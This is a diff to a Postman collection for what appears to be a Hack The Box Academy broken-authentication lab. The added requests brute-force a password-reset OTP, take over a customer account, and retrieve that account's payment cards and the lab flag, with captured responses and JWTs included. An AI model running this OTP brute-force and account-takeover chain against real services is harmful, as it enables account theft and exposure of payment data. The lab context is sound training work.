-						"value": "Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjJAcGVudGVzdGVyY29tcGFueS5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOlsiU3VwcGxpZXJDb21wYW5pZXNfR2V0WWVhcmx5UmVwb3J0QnlJRCIsIlN1cHBsaWVyc19HZXRRdWFydGVybHlSZXBvcnRCeUlEIl0sImV4cCI6MTc3NDEwMzQ3NiwiaXNzIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiIsImF1ZCI6Imh0dHA6Ly9hcGkuaW5sYW5lZnJlaWdodC5odGIifQ.QNB7pHwAUE8tBGuyUqElkvrrU-wDVhRTI3QpzcPs49tw53hYZVa8dCwB7Ix4BWRaSaBWkJeFaK7y8my1KEwUtw"
-					}
-				],
-				"url": {
-					"raw": "http://154.57.164.81:30855/api/v1/suppliers/quarterly-reports/1",
-					"protocol": "http",
-					"host": [
-						"154",
-						"57",
-						"164",
-						"81"
-					],
-					"port": "30855",
-					"path": [
-						"api",
-						"v1",
-						"suppliers",
-						"quarterly-reports",
-						"1"
-					]
-				}
-			},
-			"response": []
-		},
-		{
-			"name": "customers | login/jwt",
-			"request": {
-				"method": "POST",
-				"header": [],
-				"body": {
-					"mode": "raw",
-					"raw": "{\n  \"Email\": \"htbpentester3@pentestercompany.com\",\n  \"Password\": \"HTBPentester3\"\n}",
-					"options": {
-						"raw": {
-							"language": "json"
+			"name": "#2 -  Broken Auth Exercise | customer | OTP",
+			"item": [
+				{
+					"name": "sign in w/ working password",
+					"event": [
+						{
+							"listen": "test",
+							"script": {
+								"exec": [
+									"// Parse the JSON response",
+									"const responseData = pm.response.json();",
+									"",
+									"// Set the collection variable",
+									"if (responseData.jwt) {",
+									"    pm.collectionVariables.set(\"customer_fresh_jwt\", responseData.jwt);",
+									"    console.log(\"JWT has been updated in collection variables.\");",
+									"} else {",
+									"    console.error(\"JWT not found in the response body!\");",
+									"}"
+								],
+								"type": "text/javascript"
+							}
 						}
-					}
-				},
-				"url": {
-					"raw": "{{baseUrl}}/api/v1/authentication/customers/sign-in",
-					"host": [
-						"{{baseUrl}}"
 					],
-					"path": [
-						"api",
-						"v1",
-						"authentication",
-						"customers",
-						"sign-in"
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": "{\n    \"Email\": \"htbpentester3@hackthebox.com\",\n    \"Password\": \"HTBPentester3\"\n}",
+							"options": {
+								"raw": {
+									"language": "json"
+								}
+							}
+						},
+						"url": {
+							"raw": "{{baseUrl}}/api/v1/authentication/customers/sign-in",
+							"host": [
+								"{{baseUrl}}"
+							],
+							"path": [
+								"api",
+								"v1",
+								"authentication",
+								"customers",
+								"sign-in"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "own payment options",
+					"request": {
+						"method": "GET",
+						"header": [
+							{
+								"key": "Authorization",
+								"value": "Bearer {{customer_fresh_jwt}}",
+								"type": "default"
+							}
+						],
+						"url": {
+							"raw": "{{baseUrl}}/api/v1/customers/payment-options/current-user",
+							"host": [
+								"{{baseUrl}}"
+							],
+							"path": [
+								"api",
+								"v1",
+								"customers",
+								"payment-options",
+								"current-user"
+							]
+						}
+					},
+					"response": [
+						{
+							"name": "200 | payment options not found",
+							"originalRequest": {
+								"method": "GET",
+								"header": [
+									{
+										"key": "Authorization",
+										"value": "Bearer {{customer_fresh_jwt}}",
+										"type": "default"
+									}
+								],
+								"url": {
+									"raw": "{{baseUrl}}/api/v1/customers/payment-options/current-user",
+									"host": [
+										"{{baseUrl}}"
+									],
+									"path": [
+										"api",
+										"v1",
+										"customers",
+										"payment-options",
+										"current-user"
+									]
+								}
+							},
+							"status": "OK",
+							"code": 200,
+							"_postman_previewlanguage": "json",
+							"header": [
+								{
+									"key": "Content-Type",
+									"value": "application/json; charset=utf-8"
+								},
+								{
+									"key": "Date",
+									"value": "Sun, 22 Mar 2026 19:47:10 GMT"
+								},
+								{
+									"key": "Server",
+									"value": "Kestrel"
+								},
+								{
+									"key": "content-length",
+									"value": "53"
+								}
+							],
+							"cookie": [],
+							"body": "{\n    \"errorMessage\": \"Customer payment options not found\"\n}"
+						}
+					]
+				},
+				{
+					"name": "[fail] create own payment options",
+					"request": {
+						"method": "POST",
+						"header": [
+							{
+								"key": "Authorization",
+								"value": "Bearer {{customer_fresh_jwt}}",
+								"type": "default"
+							}
+						],
+						"body": {
+							"mode": "raw",
+							"raw": "{\n  \"CustomerID\": \"3d6b5aba-302b-4c50-a90a-088307d0b637\",\n  \"Type\": \"string\",\n  \"Provider\": \"string\",\n  \"AccountNumber\": \"string\",\n  \"CVV\": \"string\"\n}",
+							"options": {
+								"raw": {
+									"language": "json"
+								}
+							}
+						},
+						"url": {
+							"raw": "{{baseUrl}}/api/v1/customers/payment-options",
+							"host": [
+								"{{baseUrl}}"
+							],
+							"path": [
+								"api",
+								"v1",
+								"customers",
+								"payment-options"
+							]
+						}
+					},
+					"response": [
+						{
+							"name": "403 | cannot create own payment options",
+							"originalRequest": {
+								"method": "POST",
+								"header": [
+									{
+										"key": "Authorization",
+										"value": "Bearer {{customer_fresh_jwt}}",
+										"type": "default"
+									}
+								],
+								"body": {
+									"mode": "raw",
+									"raw": "{\n  \"CustomerID\": \"3d6b5aba-302b-4c50-a90a-088307d0b637\",\n  \"Type\": \"string\",\n  \"Provider\": \"string\",\n  \"AccountNumber\": \"string\",\n  \"CVV\": \"string\"\n}",
+									"options": {
+										"raw": {
+											"language": "json"
+										}
+									}
+								},
+								"url": {
+									"raw": "{{baseUrl}}/api/v1/customers/payment-options",
+									"host": [
+										"{{baseUrl}}"
+									],
+									"path": [
+										"api",
+										"v1",
+										"customers",
+										"payment-options"
+									]
+								}
+							},
+							"status": "Forbidden",
+							"code": 403,
+							"_postman_previewlanguage": "plain",
+							"header": [
+								{
+									"key": "Content-Length",
+									"value": "0"
+								},
+								{
+									"key": "Date",
+									"value": "Sun, 22 Mar 2026 19:57:06 GMT"
+								},
+								{
+									"key": "Server",
+									"value": "Kestrel"
+								}
+							],
+							"cookie": [],
+							"body": null
+						}
+					]
+				},
+				{
+					"name": "trigger reset OTP via SMS",
+					"request": {
+						"method": "POST",
+						"header": [
+							{
+								"key": "Authorization",
+								"value": "Bearer {{customer_fresh_jwt}}",
+								"type": "default",
+								"disabled": true
+							}
+						],
+						"body": {
+							"mode": "raw",
+							"raw": "{\n  \"Email\": \"MasonJenkins@ymail.com\"\n}",
+							"options": {
+								"raw": {
+									"language": "json"
+								}
+							}
+						},
+						"url": {
+							"raw": "{{baseUrl}}/api/v1/authentication/customers/passwords/resets/email-otps",
+							"host": [
+								"{{baseUrl}}"
+							],
+							"path": [
+								"api",
+								"v1",
+								"authentication",
+								"customers",
+								"passwords",
+								"resets",
+								"email-otps"
+							]
+						}
+					},
+					"response": [
+						{
+							"name": "success vs. MasonJenkins",
+							"originalRequest": {
+								"method": "POST",
+								"header": [
+									{
+										"key": "Authorization",
+										"value": "Bearer {{customer_fresh_jwt}}",
+										"type": "default",
+										"disabled": true
+									}
+								],
+								"body": {
+									"mode": "raw",
+									"raw": "{\n  \"Email\": \"MasonJenkins@ymail.com\"\n}",
+									"options": {
+										"raw": {
+											"language": "json"
+										}
+									}
+								},
+								"url": {
+									"raw": "{{baseUrl}}/api/v1/authentication/customers/passwords/resets/sms-otps",
+									"host": [
+										"{{baseUrl}}"
+									],
+									"path": [
+										"api",
+										"v1",
+										"authentication",
+										"customers",
+										"passwords",
+										"resets",
+										"sms-otps"
+									]
+								}
+							},
+							"status": "OK",
+							"code": 200,
+							"_postman_previewlanguage": "json",
+							"header": [
+								{
+									"key": "Content-Type",
+									"value": "application/json"
+								},
+								{
+									"key": "Date",
+									"value": "Sun, 22 Mar 2026 20:39:29 GMT"
+								},
+								{
+									"key": "Server",
+									"value": "Kestrel"
+								},
+								{
+									"key": "content-length",
+									"value": "22"
+								}
+							],
+							"cookie": [],
+							"body": "{\n    \"SuccessStatus\": true\n}"
+						}
+					]
+				},
+				{
+					"name": "trigger reset OTP via Email",
+					"request": {
+						"method": "POST",
+						"header": [
+							{
+								"key": "Authorization",
+								"value": "Bearer {{customer_fresh_jwt}}",
+								"type": "default",
+								"disabled": true
+							}
+						],
+						"body": {
+							"mode": "raw",
+							"raw": "{\n  \"Email\": \"MasonJenkins@ymail.com\"\n}",
+							"options": {
+								"raw": {
+									"language": "json"
+								}
+							}
+						},
+						"url": {
+							"raw": "{{baseUrl}}/api/v1/authentication/customers/passwords/resets/email-otps",
+							"host": [
+								"{{baseUrl}}"
+							],
+							"path": [
+								"api",
+								"v1",
+								"authentication",
+								"customers",
+								"passwords",
+								"resets",
+								"email-otps"
+							]
+						}
+					},
+					"response": [
+						{
+							"name": "success vs. MasonJenkins",
+							"originalRequest": {
+								"method": "POST",
+								"header": [
+									{
+										"key": "Authorization",
+										"value": "Bearer {{customer_fresh_jwt}}",
+										"type": "default",
+										"disabled": true
+									}
+								],
+								"body": {
+									"mode": "raw",
+									"raw": "{\n  \"Email\": \"MasonJenkins@ymail.com\"\n}",
+									"options": {
+										"raw": {
+											"language": "json"
+										}
+									}
+								},
+								"url": {
+									"raw": "{{baseUrl}}/api/v1/authentication/customers/passwords/resets/email-otps",
+									"host": [
+										"{{baseUrl}}"
+									],
+									"path": [
+										"api",
+										"v1",
+										"authentication",
+										"customers",
+										"passwords",
+										"resets",
+										"email-otps"
+									]
+								}
+							},
+							"status": "OK",
+							"code": 200,
+							"_postman_previewlanguage": "json",
+							"header": [
+								{
+									"key": "Content-Type",
+									"value": "application/json"
+								},
+								{
+									"key": "Date",
+									"value": "Sun, 22 Mar 2026 20:40:37 GMT"
+								},
+								{
+									"key": "Server",
+									"value": "Kestrel"
+								},
+								{
+									"key": "content-length",
+									"value": "22"
+								}
+							],
+							"cookie": [],
+							"body": "{\n    \"SuccessStatus\": true\n}"
+						}
+					]
+				},
+				{
+					"name": "attempt OTP submit | bruteforce point",
+					"request": {
+						"method": "POST",
+						"header": [
+							{
+								"key": "Content-Type",
+								"value": "application/json",
+								"type": "default"
+							}
+						],
+						"body": {
+							"mode": "raw",
+							"raw": "{\n  \"Email\": \"MasonJenkins@ymail.com\",\n  \"OTP\": \"1114\",\n  \"NewPassword\": \"string\"\n}"
+						},
+						"url": {
+							"raw": "{{baseUrl}}/api/v1/authentication/customers/passwords/resets",
+							"host": [
+								"{{baseUrl}}"
+							],
+							"path": [
+								"api",
+								"v1",
+								"authentication",
+								"customers",
+								"passwords",
+								"resets"
+							]
+						}
+					},
+					"response": [
+						{
+							"name": "200 | fail | just success status false",
+							"originalRequest": {
+								"method": "POST",
+								"header": [
+									{
+										"key": "Content-Type",
+										"value": "application/json",
+										"type": "default"
+									}
+								],
+								"body": {
+									"mode": "raw",
+									"raw": "{\n  \"Email\": \"MasonJenkins@ymail.com\",\n  \"OTP\": \"000000\",\n  \"NewPassword\": \"string\"\n}"
+								},
+								"url": {
+									"raw": "{{baseUrl}}/api/v1/authentication/customers/passwords/resets",
+									"host": [
+										"{{baseUrl}}"
+									],
+									"path": [
+										"api",
+										"v1",
+										"authentication",
+										"customers",
+										"passwords",
+										"resets"
+									]
+								}
+							},
+							"status": "OK",
+							"code": 200,
+							"_postman_previewlanguage": "json",
+							"header": [
+								{
+									"key": "Content-Type",
+									"value": "application/json"
+								},
+								{
+									"key": "Date",
+									"value": "Sun, 22 Mar 2026 20:53:36 GMT"
+								},
+								{
+									"key": "Server",
+									"value": "Kestrel"
+								},
+								{
+									"key": "content-length",
+									"value": "23"
+								}
+							],
+							"cookie": [],
+							"body": "{\n    \"SuccessStatus\": false\n}"
+						},
+						{
+							"name": "200 | success | after bruteforce",
+							"originalRequest": {
+								"method": "POST",
+								"header": [
+									{
+										"key": "Content-Type",
+										"value": "application/json",
+										"type": "default"
+									}
+								],
+								"body": {
+									"mode": "raw",
+									"raw": "{\n  \"Email\": \"MasonJenkins@ymail.com\",\n  \"OTP\": \"1114\",\n  \"NewPassword\": \"string\"\n}"
+								},
+								"url": {
+									"raw": "{{baseUrl}}/api/v1/authentication/customers/passwords/resets",
+									"host": [
+										"{{baseUrl}}"
+									],
+									"path": [
+										"api",
+										"v1",
+										"authentication",
+										"customers",
+										"passwords",
+										"resets"
+									]
+								}
+							},
+							"status": "OK",
+							"code": 200,
+							"_postman_previewlanguage": "json",
+							"header": [
+								{
+									"key": "Content-Type",
+									"value": "application/json"
+								},
+								{
+									"key": "Date",
+									"value": "Sun, 22 Mar 2026 21:09:45 GMT"
+								},
+								{
+									"key": "Server",
+									"value": "Kestrel"
+								},
+								{
+									"key": "content-length",
+									"value": "22"
+								}
+							],
+							"cookie": [],
+							"body": "{\n    \"SuccessStatus\": true\n}"
+						}
+					]
+				},
+				{
+					"name": "sign in w/ stolen account's reset password",
+					"event": [
+						{
+							"listen": "test",
+							"script": {
+								"exec": [
+									"// Parse the JSON response",
+									"const responseData = pm.response.json();",
+									"",
+									"// Set the collection variable",
+									"if (responseData.jwt) {",
+									"    pm.collectionVariables.set(\"mason_jenkins_jwt\", responseData.jwt);",
+									"    console.log(\"JWT has been updated in collection variables.\");",
+									"} else {",
+									"    console.error(\"JWT not found in the response body!\");",
+									"}"
+								],
+								"type": "text/javascript"
+							}
+						},
+						{
+							"listen": "prerequest",
+							"script": {
+								"exec": [
+									""
+								],
+								"type": "text/javascript"
+							}
+						}
+					],
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": "{\n    \"Email\": \"MasonJenkins@ymail.com\",\n    \"Password\": \"string\"\n}",
+							"options": {
+								"raw": {
+									"language": "json"
+								}
+							}
+						},
+						"url": {
+							"raw": "{{baseUrl}}/api/v1/authentication/customers/sign-in",
+							"host": [
+								"{{baseUrl}}"
+							],
+							"path": [
+								"api",
+								"v1",
+								"authentication",
+								"customers",
+								"sign-in"
+							]
+						}
+					},
+					"response": [
+						{
+							"name": "success",
+							"originalRequest": {
+								"method": "POST",
+								"header": [],
+								"body": {
+									"mode": "raw",
+									"raw": "{\n    \"Email\": \"MasonJenkins@ymail.com\",\n    \"Password\": \"string\"\n}",
+									"options": {
+										"raw": {
+											"language": "json"
+										}
+									}
+								},
+								"url": {
+									"raw": "{{baseUrl}}/api/v1/authentication/customers/sign-in",
+									"host": [
+										"{{baseUrl}}"
+									],
+									"path": [
+										"api",
+										"v1",
+										"authentication",
+										"customers",
+										"sign-in"
+									]
+								}
+							},
+							"status": "OK",
+							"code": 200,
+							"_postman_previewlanguage": "json",
+							"header": [
+								{
+									"key": "Content-Type",
+									"value": "application/json; charset=utf-8"
+								},
+								{
+									"key": "Date",
+									"value": "Sun, 22 Mar 2026 21:11:29 GMT"
+								},
+								{
+									"key": "Server",
+									"value": "Kestrel"
+								},
+								{
+									"key": "content-length",
+									"value": "385"
+								}
+							],
+							"cookie": [],
+							"body": "{\n    \"jwt\": \"eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Ik1hc29uSmVua2luc0B5bWFpbC5jb20iLCJleHAiOjE3NzQyMTUwODksImlzcyI6Imh0dHA6Ly9hcGkuaW5sYW5lZnJlaWdodC5odGIiLCJhdWQiOiJodHRwOi8vYXBpLmlubGFuZWZyZWlnaHQuaHRiIn0.EExg7tFnT_OMVwWm9qeGi5EcbUtVZGGEErR61v8ZM7dHgp9_aCRcmL4syWzguXXgdm3RI0G7lkt2gzCk8ap3wA\"\n}"
+						}
+					]
+				},
+				{
+					"name": "stolen account's payment options (flag)",
+					"request": {
+						"method": "GET",
+						"header": [
+							{
+								"key": "Authorization",
+								"value": "Bearer {{mason_jenkins_jwt}}",
+								"type": "default"
+							}
+						],
+						"url": {
+							"raw": "{{baseUrl}}/api/v1/customers/payment-options/current-user",
+							"host": [
+								"{{baseUrl}}"
+							],
+							"path": [
+								"api",
+								"v1",
+								"customers",
+								"payment-options",
+								"current-user"
+							]
+						}
+					},
+					"response": [
+						{
+							"name": "success | mason jenkins cards and flag",
+							"originalRequest": {
+								"method": "GET",
+								"header": [
+									{
+										"key": "Authorization",
+										"value": "Bearer {{mason_jenkins_jwt}}",
+										"type": "default"
+									}
+								],
+								"url": {
+									"raw": "{{baseUrl}}/api/v1/customers/payment-options/current-user",
+									"host": [
+										"{{baseUrl}}"
+									],
+									"path": [
+										"api",
+										"v1",
+										"customers",
+										"payment-options",
+										"current-user"
+									]
+								}
+							},
+							"status": "OK",
+							"code": 200,
+							"_postman_previewlanguage": "json",
+							"header": [
+								{
+									"key": "Content-Type",
+									"value": "application/json; charset=utf-8"
+								},
+								{
+									"key": "Date",
+									"value": "Sun, 22 Mar 2026 21:14:42 GMT"
+								},
+								{
+									"key": "Server",
+									"value": "Kestrel"
+								},
+								{
+									"key": "content-length",
+									"value": "408"
+								}
+							],
+							"cookie": [],
+							"body": "{\n    \"customerPaymentOptions\": [\n        {\n            \"customerID\": \"53428a83-8591-4548-a553-c434ad76a61a\",\n            \"type\": \"Debit Card\",\n            \"provider\": \"Capital One\",\n            \"accountNumber\": \"9754729874181436\",\n            \"cvvHash\": \"B6EDC1CD1F36E45DAF6D7824D7BB2283\"\n        },\n        {\n            \"customerID\": \"53428a83-8591-4548-a553-c434ad76a61a\",\n            \"type\": \"Credit Card\",\n            \"provider\": \"HTB Academy\",\n            \"accountNumber\": \"HTB{115a6329120e9eff13c4ec6a63343ed1}\",\n            \"cvvHash\": \"5EF0B4EBA35AB2D6180B0BCA7E46B6F9\"\n        }\n    ]\n}"
+						}
 					]
 				}
-			},
-			"response": []
+			]
 		}
 	],
 	"event": [
@@ -248,11 +1867,19 @@
 	"variable": [
 		{
 			"key": "baseUrl",
-			"value": "http://154.57.164.83:30954",
+			"value": "154.57.164.80:31513",
 			"type": "default"
 		},
 		{
 			"key": "supplier_fresh_jwt",
+			"value": ""
+		},
+		{
+			"key": "customer_fresh_jwt",
+			"value": ""
+		},
+		{
+			"key": "mason_jenkins_jwt",
 			"value": ""
 		}
 	]
